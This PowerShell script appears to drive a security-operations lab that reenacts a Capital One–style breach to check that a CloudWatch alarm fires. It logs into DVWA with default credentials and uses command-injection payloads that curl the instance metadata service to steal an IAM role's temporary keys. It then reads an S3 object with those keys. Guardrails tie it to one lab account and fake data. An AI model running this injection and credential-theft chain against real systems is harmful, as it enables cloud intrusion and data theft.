#requires -Version 5.1
[CmdletBinding()]
param(
    [string]$AwsProfile = 'terra-user',
    [string]$EvidenceRoot = '',
    [string]$ExperimentId = '',
    [string]$TakeId = '',
    [ValidateRange(60, 900)]
    [int]$AlarmWaitSeconds = 600,
    [ValidateRange(10, 60)]
    [int]$RequestTimeoutSeconds = 30,
    [switch]$SkipAlarmWait,
    [switch]$RequireSocReadyTake,
    [string]$ConfirmRun = ''
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$terraformRoot = (Resolve-Path (Join-Path $PSScriptRoot '..\..')).Path
$region = 'ap-northeast-2'
$expectedAccountId = '433048100798'
$objectKey = 'validation/capital-one-demo.csv'
$trainingMarker = 'FAKE_TRAINING_DATA'
$imdsRoleUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
$minimumSessionRemainingMinutes = 30
$socSecurityModulePath = Join-Path $terraformRoot 'automation\SocLab.Security.psm1'
Import-Module $socSecurityModulePath -Force
Import-Module (Join-Path $terraformRoot 'automation\SocLab.Runtime.psm1') -Force
if (-not $EvidenceRoot) {
    $EvidenceRoot = Join-Path (
        [Environment]::GetFolderPath('MyDocuments')
    ) 'aws-topology-evidence'
}
if (-not $ExperimentId) {
    $ExperimentId = New-SocTakeId
}
if (-not $TakeId) {
    $TakeId = $ExperimentId
}
if ($ExperimentId -notmatch '^[A-Za-z0-9][A-Za-z0-9._-]{2,80}$') {
    throw 'ExperimentId must use safe path characters.'
}
if ($TakeId -cnotmatch '^capital-one-[0-9]{8}T[0-9]{6}Z-[a-f0-9]{8}$') {
    throw 'TakeId must use the fixed capital-one-yyyyMMddTHHmmssZ-xxxxxxxx format.'
}
if ($RequireSocReadyTake.IsPresent) {
    $socRuntimeRoot = Get-SocRuntimeRoot
    $activeSessionPath = Join-Path $socRuntimeRoot 'active-soc-session.json'
    if (-not (Test-Path -LiteralPath $activeSessionPath -PathType Leaf)) {
        throw 'The active SOC session is unavailable.'
    }
    $activeSession = Get-Content -LiteralPath $activeSessionPath -Raw | ConvertFrom-Json
    if ([int]$activeSession.schema_version -ne 1 -or
        [string]$activeSession.status -notin @('READY','ATTACK_STARTED') -or
        [string]$activeSession.take_id -cne $TakeId -or
        [string]$activeSession.session_path -notlike "$socRuntimeRoot\soc-*" -or
        -not (Test-Path -LiteralPath ([string]$activeSession.session_path) -PathType Container)) {
        throw 'The requested attack is not bound to the active READY SOC session.'
    }
    $activeTake = Read-SocTakeRecord -RuntimeRoot ([string]$activeSession.session_path)
    if ([string]$activeTake.take_id -cne $TakeId -or
        [string]$activeTake.status -notin @('READY','ATTACK_STARTED') -or
        [datetimeoffset]$activeTake.expires_at_utc -le [datetimeoffset]::UtcNow) {
        throw 'The requested attack is not bound to one unexpired READY TAKE.'
    }
}

. (Join-Path $terraformRoot 'daily-common.ps1')
. (Join-Path $terraformRoot 'daily-session-common.ps1')
Add-Type -AssemblyName System.Web

function Write-CapitalOneJson {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)]$Value
    )

    $parent = Split-Path -Parent $Path
    New-Item -ItemType Directory -Force -Path $parent | Out-Null
    [IO.File]::WriteAllText(
        $Path,
        ($Value | ConvertTo-Json -Depth 10),
        (New-Object Text.UTF8Encoding($false))
    )
}

function Invoke-SensitiveNativeCapture {
    param(
        [Parameter(Mandatory)][string]$FilePath,
        [Parameter(Mandatory)][string[]]$ArgumentList,
        [Parameter(Mandatory)][string]$FailureMessage
    )

    $previousPreference = $ErrorActionPreference
    try {
        $ErrorActionPreference = 'Continue'
        $output = & $FilePath @ArgumentList 2>&1
        $exitCode = $LASTEXITCODE
    } finally {
        $ErrorActionPreference = $previousPreference
    }
    if ($exitCode -ne 0) {
        $output = $null
        throw $FailureMessage
    }
    return ($output | Out-String).Trim()
}

function Get-MarkedResponseValue {
    param(
        [Parameter(Mandatory)][string]$Html,
        [Parameter(Mandatory)][string]$StartMarker,
        [Parameter(Mandatory)][string]$EndMarker
    )

    $decoded = [System.Web.HttpUtility]::HtmlDecode($Html)
    $start = $decoded.IndexOf($StartMarker, [StringComparison]::Ordinal)
    if ($start -lt 0) {
        throw 'The fixed command response start marker was not found.'
    }
    $start += $StartMarker.Length
    $end = $decoded.IndexOf($EndMarker, $start, [StringComparison]::Ordinal)
    if ($end -lt 0) {
        throw 'The fixed command response end marker was not found.'
    }
    return $decoded.Substring($start, $end - $start).Trim()
}

function Invoke-DvwaForm {
    param(
        [Parameter(Mandatory)][uri]$Uri,
        [Parameter(Mandatory)]$Session,
        [Parameter(Mandatory)][hashtable]$Body,
        [hashtable]$Headers = @{}
    )

    try {
        return Invoke-WebRequest `
            -Uri $Uri `
            -Method Post `
            -WebSession $Session `
            -UseBasicParsing `
            -TimeoutSec $RequestTimeoutSeconds `
            -Body $Body `
            -Headers $Headers `
            -ErrorAction Stop
    } catch {
        throw 'The fixed DVWA form request failed.'
    }
}

function Get-AlarmSnapshot {
    param([Parameter(Mandatory)][string]$AlarmName)

    $result = Invoke-NativeCapture -FilePath 'aws' -ArgumentList @(
        'cloudwatch', 'describe-alarms',
        '--profile', $AwsProfile,
        '--region', $region,
        '--alarm-names', $AlarmName,
        '--output', 'json',
        '--no-cli-pager'
    ) -FailureMessage 'The Capital One alarm could not be read.' | ConvertFrom-Json
    $alarms = @($result.MetricAlarms)
    if ($alarms.Count -ne 1) {
        throw 'The Capital One detector must resolve to exactly one alarm.'
    }
    return $alarms[0]
}

$credentialEnvironmentNames = @(
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'AWS_SESSION_TOKEN',
    'AWS_SECURITY_TOKEN'
)
foreach ($name in $credentialEnvironmentNames) {
    if ([Environment]::GetEnvironmentVariable($name, 'Process')) {
        throw "Clear the process-level $name before the controlled baseline."
    }
}
$temporaryEnvironmentNames = @(
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'AWS_SESSION_TOKEN',
    'AWS_SECURITY_TOKEN',
    'AWS_REGION',
    'AWS_DEFAULT_REGION',
    'AWS_EC2_METADATA_DISABLED'
)
$previousEnvironment = @{}
foreach ($name in $temporaryEnvironmentNames) {
    $previousEnvironment[$name] = [Environment]::GetEnvironmentVariable(
        $name,
        'Process'
    )
}

Assert-CommandAvailable -Name 'terraform' | Out-Null
Assert-CommandAvailable -Name 'aws' | Out-Null

$identity = Invoke-NativeCapture -FilePath 'aws' -ArgumentList @(
    'sts', 'get-caller-identity',
    '--profile', $AwsProfile,
    '--region', $region,
    '--output', 'json',
    '--no-cli-pager'
) -FailureMessage 'AWS identity could not be verified.' | ConvertFrom-Json
if ([string]$identity.Account -cne $expectedAccountId) {
    throw 'AWS account mismatch. The fixed Capital One lab account is required.'
}

$sessionPath = Get-DailySessionActiveStatePath
$dailySession = Read-DailySessionState -Path $sessionPath
if ([string]$dailySession.Status -cne 'Active' -or
    [string]$dailySession.SecurityScenarioProfile -cne 'capital-one-lab' -or
    [string]$dailySession.AccountId -cne $expectedAccountId -or
    [string]$dailySession.PrimaryRegion -cne $region -or
    [IO.Path]::GetFullPath([string]$dailySession.TerraformRoot) -cne
        [IO.Path]::GetFullPath($terraformRoot)) {
    throw 'The Active Daily Session does not match the fixed Capital One lab runtime.'
}
$remaining = [datetimeoffset]$dailySession.HardDeadlineAtUtc -
    [datetimeoffset]::UtcNow
if ($remaining.TotalMinutes -lt $minimumSessionRemainingMinutes) {
    throw 'The Daily Session has too little time left for a controlled alarm validation.'
}

$runtimeProfile = (Invoke-NativeCapture -FilePath 'terraform' -ArgumentList @(
    "-chdir=$terraformRoot", 'output', '-raw', 'runtime_profile'
) -FailureMessage 'The active Runtime profile is unavailable.').Trim()
$securityProfile = (Invoke-NativeCapture -FilePath 'terraform' -ArgumentList @(
    "-chdir=$terraformRoot", 'output', '-raw', 'security_scenario_profile'
) -FailureMessage 'The active security scenario profile is unavailable.').Trim()
$scenarioFeatures = Invoke-NativeCapture -FilePath 'terraform' -ArgumentList @(
    "-chdir=$terraformRoot", 'output', '-json', 'security_scenario_features'
) -FailureMessage 'The active security scenario features are unavailable.' |
    ConvertFrom-Json
$podIdentityEnabled = (Invoke-NativeCapture -FilePath 'terraform' -ArgumentList @(
    "-chdir=$terraformRoot", 'output', '-raw', 'web_s3_pod_identity_enabled'
) -FailureMessage 'The Pod Identity state is unavailable.').Trim()

if ($runtimeProfile -cne 'minimal' -or $securityProfile -cne 'capital-one-lab') {
    throw 'The baseline requires the prepared minimal + capital-one-lab Runtime.'
}
if (-not [bool]$scenarioFeatures.primary_validation_read_enabled -or
    [string]$scenarioFeatures.primary_metadata_options.httpTokens -cne 'optional' -or
    [int]$scenarioFeatures.primary_metadata_options.httpPutResponseHopLimit -ne 2 -or
    [bool]$scenarioFeatures.dr_validation_read_enabled -or
    [string]$scenarioFeatures.dr_metadata_options.httpTokens -cne 'required' -or
    [int]$scenarioFeatures.dr_metadata_options.httpPutResponseHopLimit -ne 1) {
    throw 'Terraform security features do not match the bounded Primary-only lab contract.'
}
if ([Convert]::ToBoolean($podIdentityEnabled)) {
    throw 'The baseline targets the Node Role and refuses an enabled web Pod Identity path.'
}

$applicationUrl = (Invoke-NativeCapture -FilePath 'terraform' -ArgumentList @(
    "-chdir=$terraformRoot", 'output', '-raw', 'application_url'
) -FailureMessage 'The project application URL is unavailable.').Trim()
$baseUri = [uri]$applicationUrl
if ($baseUri.Scheme -cne 'https' -or -not $baseUri.Host) {
    throw 'Terraform returned an unsafe project application URL.'
}
$loginUri = [uri]::new($baseUri, '/login.php')
$execUri = [uri]::new($baseUri, '/vulnerabilities/exec/')

$bucket = (Invoke-NativeCapture -FilePath 'terraform' -ArgumentList @(
    "-chdir=$terraformRoot", 'output', '-raw', 'primary_application_bucket_name'
) -FailureMessage 'The Primary application bucket is unavailable.').Trim()
if ($bucket -notmatch '^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$') {
    throw 'Terraform returned an unsafe Primary application bucket name.'
}

$dataEventsEnabled = (Invoke-NativeCapture -FilePath 'terraform' -ArgumentList @(
    "-chdir=$(Join-Path $terraformRoot 'foundation')",
    'output', '-raw', 'project_s3_data_events_enabled'
) -FailureMessage 'The Foundation S3 Data Event state is unavailable.').Trim()
$detection = Invoke-NativeCapture -FilePath 'terraform' -ArgumentList @(
    "-chdir=$(Join-Path $terraformRoot 'foundation')",
    'output', '-json', 'capital_one_s3_detection'
) -FailureMessage 'The Foundation Capital One detector is unavailable.' |
    ConvertFrom-Json
if ($dataEventsEnabled.ToLowerInvariant() -cne 'true' -or
    -not [bool]$detection.enabled -or
    -not [string]$detection.alarm_name) {
    throw 'The approved S3 Data Event and Capital One detector must both be active.'
}
$expectedRoleName = [string]$detection.expected_role_name
if ($expectedRoleName -notmatch '^[A-Za-z0-9+=,.@_-]{1,64}$') {
    throw 'The expected Karpenter role name is unsafe.'
}

$head = Invoke-NativeCapture -FilePath 'aws' -ArgumentList @(
    's3api', 'head-object',
    '--profile', $AwsProfile,
    '--region', $region,
    '--bucket', $bucket,
    '--key', $objectKey,
    '--output', 'json',
    '--no-cli-pager'
) -FailureMessage 'Run Prepare-CapitalOneDemoData.ps1 before the baseline.' |
    ConvertFrom-Json
$expectedContentSha256 = [string]$head.Metadata.sha256
$expectedRecordCount = [int]$head.Metadata.'record-count'
if ([string]$head.Metadata.'training-marker' -cne $trainingMarker -or
    $expectedContentSha256 -notmatch '^[a-f0-9]{64}$' -or
    $expectedRecordCount -lt 1 -or $expectedRecordCount -gt 20) {
    throw 'The fixed validation object is missing safe fake-data metadata.'
}

$alarmBefore = Get-AlarmSnapshot -AlarmName ([string]$detection.alarm_name)
if ([string]$alarmBefore.StateValue -cne 'OK' -or
    -not [bool]$alarmBefore.ActionsEnabled -or
    @($alarmBefore.AlarmActions).Count -lt 1) {
    throw 'The Capital One alarm must be OK with an enabled action before a new TAKE.'
}

Write-Host 'Capital One baseline preview'
Write-Host 'AWS account matched: yes'
Write-Host "Runtime: $runtimeProfile + $securityProfile"
Write-Host 'Target: Terraform application_url -> fixed /vulnerabilities/exec/'
Write-Host "Fixed object key: $objectKey"
Write-Host "Expected fake rows / SHA-256: $expectedRecordCount / $expectedContentSha256"
Write-Host "Alarm before TAKE: $($alarmBefore.StateValue)"
Write-Host "Alarm wait after attack: $(-not $SkipAlarmWait.IsPresent)"
Write-Host "Experiment / TAKE: $ExperimentId / $TakeId"
Write-Host 'Account ID, bucket, cookies, command response, and credentials are not printed.'

if ($ConfirmRun -cne 'RUN CAPITAL ONE BASELINE') {
    throw (
        "Preview only. Re-run with -ConfirmRun 'RUN CAPITAL ONE BASELINE' " +
        'after the sanitized dry-run and static tests pass.'
    )
}

$recordPath = Join-Path $EvidenceRoot (
    "$ExperimentId\source\client\capital-one-baseline.json"
)
$tempRoot = Join-Path ([IO.Path]::GetTempPath()) (
    'aws-topology-capital-one-' + [guid]::NewGuid().ToString('N')
)
$downloadPath = Join-Path $tempRoot 'capital-one-demo.csv'
$startedAt = [datetimeoffset]::UtcNow
$finishedAt = $null
$failureStage = ''
$failureType = ''
$roleMatched = $false
$callerRoleMatched = $false
$getObjectSucceeded = $false
$markerValidated = $false
$contentSha256 = ''
$recordCount = 0
$alarmTransitioned = $false
$alarmUpdatedAtUtc = ''
$roleRequestEdgeId = ''
$credentialRequestEdgeId = ''
$credentialDocument = $null
$credentialResponse = $null
$roleResponse = $null
$webSession = $null
$takeIdHeaderPostCount = 0

try {
    New-Item -ItemType Directory -Path $tempRoot | Out-Null
    $failureStage = 'dvwa-login'
    $webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $webSession.UserAgent = 'aws-topology-capital-one-baseline/1.0'
    try {
        $loginPage = Invoke-WebRequest `
            -Uri $loginUri `
            -Method Get `
            -WebSession $webSession `
            -UseBasicParsing `
            -TimeoutSec $RequestTimeoutSeconds `
            -ErrorAction Stop
    } catch {
        throw 'The fixed DVWA login page could not be loaded.'
    }
    $tokenMatch = [regex]::Match(
        [string]$loginPage.Content,
        'name\s*=\s*["'']user_token["''][^>]*value\s*=\s*["'']([^"'']+)["'']',
        [Text.RegularExpressions.RegexOptions]::IgnoreCase
    )
    $loginPage = $null
    if (-not $tokenMatch.Success) {
        throw 'The DVWA login CSRF token was not found.'
    }
    [void](Invoke-DvwaForm -Uri $loginUri -Session $webSession -Body @{
        username = 'admin'
        password = 'password'
        Login = 'Login'
        user_token = $tokenMatch.Groups[1].Value
    })

    $failureStage = 'dvwa-low-preflight'
    try {
        $execPage = Invoke-WebRequest `
            -Uri $execUri `
            -Method Get `
            -WebSession $webSession `
            -UseBasicParsing `
            -TimeoutSec $RequestTimeoutSeconds `
            -ErrorAction Stop
    } catch {
        throw 'The fixed DVWA Command Injection page could not be loaded.'
    }
    $securityCookie = @(
        $webSession.Cookies.GetCookies($baseUri) |
            Where-Object { $_.Name -ceq 'security' }
    ) | Select-Object -Last 1
    if (-not $securityCookie -or $securityCookie.Value -cne 'low' -or
        [string]$execPage.Content -notmatch 'name\s*=\s*["'']ip["'']') {
        $execPage = $null
        throw 'DVWA is not ready at the expected low Command Injection page.'
    }
    $execPage = $null

    $failureStage = 'imds-role-discovery'
    $attackHeaders = @{
        'X-SOC-TAKE-ID' = $TakeId
    }
    $roleStart = '__CAPITAL_ROLE_BEGIN__'
    $roleEnd = '__CAPITAL_ROLE_END__'
    $rolePayload = (
        "127.0.0.1; printf '\n$roleStart\n'; " +
        "curl -s --max-time 5 $imdsRoleUrl; " +
        "printf '\n$roleEnd\n'"
    )
    $roleResponse = Invoke-DvwaForm -Uri $execUri -Session $webSession -Headers $attackHeaders -Body @{
        ip = $rolePayload
        Submit = 'Submit'
    }
    $takeIdHeaderPostCount++
    if ($roleResponse.Headers['X-Amz-Cf-Id']) {
        $roleRequestEdgeId = [string]$roleResponse.Headers['X-Amz-Cf-Id']
    }
    $discoveredRole = Get-MarkedResponseValue `
        -Html ([string]$roleResponse.Content) `
        -StartMarker $roleStart `
        -EndMarker $roleEnd
    $roleResponse = $null
    $rolePayload = $null
    if ($discoveredRole -cne $expectedRoleName) {
        throw 'IMDS did not return the expected fixed Karpenter Node Role.'
    }
    $roleMatched = $true
    Write-Host "IMDS role discovery: matched $expectedRoleName"

    $failureStage = 'imds-credential-acquisition'
    $credentialStart = '__CAPITAL_CREDS_BEGIN__'
    $credentialEnd = '__CAPITAL_CREDS_END__'
    $credentialPayload = (
        "127.0.0.1; printf '\n$credentialStart\n'; " +
        "curl -s --max-time 5 $imdsRoleUrl$expectedRoleName; " +
        "printf '\n$credentialEnd\n'"
    )
    $credentialResponse = Invoke-DvwaForm -Uri $execUri -Session $webSession -Headers $attackHeaders -Body @{
        ip = $credentialPayload
        Submit = 'Submit'
    }
    $takeIdHeaderPostCount++
    if ($credentialResponse.Headers['X-Amz-Cf-Id']) {
        $credentialRequestEdgeId = [string]$credentialResponse.Headers['X-Amz-Cf-Id']
    }
    $credentialJson = Get-MarkedResponseValue `
        -Html ([string]$credentialResponse.Content) `
        -StartMarker $credentialStart `
        -EndMarker $credentialEnd
    $credentialResponse = $null
    $credentialPayload = $null
    try {
        $credentialDocument = $credentialJson | ConvertFrom-Json
    } catch {
        throw 'IMDS returned a credential document that could not be parsed.'
    } finally {
        $credentialJson = $null
    }
    if ([string]$credentialDocument.Code -cne 'Success' -or
        [string]$credentialDocument.AccessKeyId -notmatch '^(AKIA|ASIA)[A-Z0-9]{16}$' -or
        [string]::IsNullOrWhiteSpace([string]$credentialDocument.SecretAccessKey) -or
        [string]::IsNullOrWhiteSpace([string]$credentialDocument.Token) -or
        [datetimeoffset]$credentialDocument.Expiration -le
            [datetimeoffset]::UtcNow.AddMinutes(5)) {
        throw 'IMDS did not return a usable short-lived role credential document.'
    }
    Write-Host 'IMDS credential acquisition: succeeded (values hidden)'

    $failureStage = 'stolen-role-s3-read'
    try {
        $env:AWS_ACCESS_KEY_ID = [string]$credentialDocument.AccessKeyId
        $env:AWS_SECRET_ACCESS_KEY = [string]$credentialDocument.SecretAccessKey
        $env:AWS_SESSION_TOKEN = [string]$credentialDocument.Token
        $env:AWS_REGION = $region
        $env:AWS_DEFAULT_REGION = $region
        $env:AWS_EC2_METADATA_DISABLED = 'true'

        $callerArn = Invoke-SensitiveNativeCapture -FilePath 'aws' -ArgumentList @(
            'sts', 'get-caller-identity',
            '--query', 'Arn',
            '--output', 'text',
            '--no-cli-pager'
        ) -FailureMessage 'The stolen role credential could not call STS.'
        if ($callerArn -notmatch (
            '^arn:aws:sts::' + [regex]::Escape($expectedAccountId) +
            ':assumed-role/' + [regex]::Escape($expectedRoleName) + '/[^/]+$'
        )) {
            throw 'The temporary credential caller did not match the expected Node Role.'
        }
        $callerRoleMatched = $true
        $callerArn = $null

        [void](Invoke-SensitiveNativeCapture -FilePath 'aws' -ArgumentList @(
            's3api', 'get-object',
            '--region', $region,
            '--bucket', $bucket,
            '--key', $objectKey,
            $downloadPath,
            '--output', 'json',
            '--no-cli-pager'
        ) -FailureMessage 'The stolen role credential could not read the fixed validation object.')
        $getObjectSucceeded = $true
    } finally {
        foreach ($name in $temporaryEnvironmentNames) {
            if ($null -eq $previousEnvironment[$name]) {
                Remove-Item "Env:$name" -ErrorAction SilentlyContinue
            } else {
                [Environment]::SetEnvironmentVariable(
                    $name,
                    [string]$previousEnvironment[$name],
                    'Process'
                )
            }
        }
        $credentialDocument = $null
    }

    $failureStage = 'fake-data-validation'
    $contentSha256 = (Get-FileHash -LiteralPath $downloadPath -Algorithm SHA256).Hash.
        ToLowerInvariant()
    $downloadedLines = @(Get-Content -LiteralPath $downloadPath)
    if ($downloadedLines.Count -lt 2 -or
        $downloadedLines[0] -cne
            'training_marker,record_id,customer_name,email,account_last4') {
        throw 'The downloaded object is not the fixed fake-data CSV.'
    }
    $dataLines = @($downloadedLines | Select-Object -Skip 1)
    if (@($dataLines | Where-Object { $_ -notlike "$trainingMarker,*" }).Count -ne 0) {
        throw 'A downloaded row is missing the explicit fake training marker.'
    }
    $recordCount = $dataLines.Count
    $downloadedLines = $null
    $dataLines = $null
    if ($contentSha256 -cne $expectedContentSha256 -or
        $recordCount -ne $expectedRecordCount) {
        throw 'The downloaded fake object hash or row count does not match preparation.'
    }
    $markerValidated = $true
    Write-Host (
        "Fixed fake S3 data read: succeeded; marker=$trainingMarker " +
        "rows=$recordCount sha256=$contentSha256"
    )

    if ($SkipAlarmWait.IsPresent) {
        Write-Host 'Capital One alarm wait: skipped for the separate low-latency SOC path.'
    } else {
        $failureStage = 'alarm-transition'
        $alarmDeadline = [datetimeoffset]::UtcNow.AddSeconds($AlarmWaitSeconds)
        do {
            $alarmNow = Get-AlarmSnapshot -AlarmName ([string]$detection.alarm_name)
            $alarmUpdatedAt = [datetimeoffset]$alarmNow.StateUpdatedTimestamp
            if ([string]$alarmNow.StateValue -ceq 'ALARM' -and
                $alarmUpdatedAt -ge $startedAt) {
                $alarmTransitioned = $true
                $alarmUpdatedAtUtc = $alarmUpdatedAt.ToUniversalTime().ToString('o')
                break
            }
            Start-Sleep -Seconds 10
        } while ([datetimeoffset]::UtcNow -lt $alarmDeadline)
        if (-not $alarmTransitioned) {
            throw 'The bounded wait ended before a new Capital One alarm transition appeared.'
        }
        Write-Host "Capital One alarm: new ALARM transition at $alarmUpdatedAtUtc"
    }
} catch {
    $failureType = $_.Exception.GetType().FullName
} finally {
    foreach ($name in $temporaryEnvironmentNames) {
        if ($null -eq $previousEnvironment[$name]) {
            Remove-Item "Env:$name" -ErrorAction SilentlyContinue
        } else {
            [Environment]::SetEnvironmentVariable(
                $name,
                [string]$previousEnvironment[$name],
                'Process'
            )
        }
    }
    $credentialDocument = $null
    $credentialResponse = $null
    $roleResponse = $null
    Remove-Item -LiteralPath $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
    $finishedAt = [datetimeoffset]::UtcNow
}

$credentialEnvironmentCleared = @(
    $credentialEnvironmentNames | Where-Object {
        [Environment]::GetEnvironmentVariable($_, 'Process')
    }
).Count -eq 0
if (-not $credentialEnvironmentCleared) {
    $failureStage = 'credential-environment-cleanup'
    $failureType = 'SocLab.CredentialEnvironmentCleanupFailed'
}

$record = [ordered]@{
    SchemaVersion = 1
    ScenarioId = 'CAPITAL-ONE'
    ExperimentId = $ExperimentId
    TakeId = $TakeId
    StartedAtUtc = $startedAt.ToString('o')
    FinishedAtUtc = $finishedAt.ToString('o')
    AwsAccountMatched = $true
    Region = $region
    RuntimeProfile = $runtimeProfile
    SecurityScenarioProfile = $securityProfile
    EntryPoint = 'DVWA Command Injection proxy for server-side request execution'
    TargetDerivedFromTerraform = $true
    ObjectKey = $objectKey
    ExpectedRoleName = $expectedRoleName
    RoleMatched = $roleMatched
    CallerRoleMatched = $callerRoleMatched
    GetObjectSucceeded = $getObjectSucceeded
    TrainingMarker = $trainingMarker
    MarkerValidated = $markerValidated
    RecordCount = $recordCount
    ContentSha256 = $contentSha256
    AlarmStartedOk = $true
    AlarmWaitSkipped = $SkipAlarmWait.IsPresent
    AlarmTransitioned = $alarmTransitioned
    AlarmUpdatedAtUtc = $alarmUpdatedAtUtc
    RoleRequestEdgeId = $roleRequestEdgeId
    CredentialRequestEdgeId = $credentialRequestEdgeId
    TakeIdHeaderPostCount = $takeIdHeaderPostCount
    TakeIdHeaderSent = ($takeIdHeaderPostCount -eq 2)
    CredentialHandling = 'memory-only; values never printed or persisted'
    TemporaryCredentialEnvironmentCleared = $credentialEnvironmentCleared
    BucketPersisted = $false
    FailureStage = if ($failureType) { $failureStage } else { '' }
    FailureType = $failureType
}
Write-CapitalOneJson -Path $recordPath -Value $record

Write-Host "Sanitized baseline record: $recordPath"
Write-Host 'Collect the matching CloudTrail evidence with:'
Write-Host ".\daily-down.ps1 -EvidenceOnly -RunEvidenceQueries -ExperimentId '$ExperimentId' -ScenarioId 'CAPITAL-ONE' -EvidenceStartUtc '$($startedAt.ToString('o'))' -EvidenceEndUtc '$($finishedAt.ToString('o'))' -EvidenceEventTailSeconds 2 -EvidenceDeliveryGraceMinutes 10"

if ($failureType) {
    throw "CAPITAL-ONE baseline failed at '$failureStage'. See the sanitized record."
}
Write-Host 'CAPITAL-ONE baseline completed without exposing credential values.'
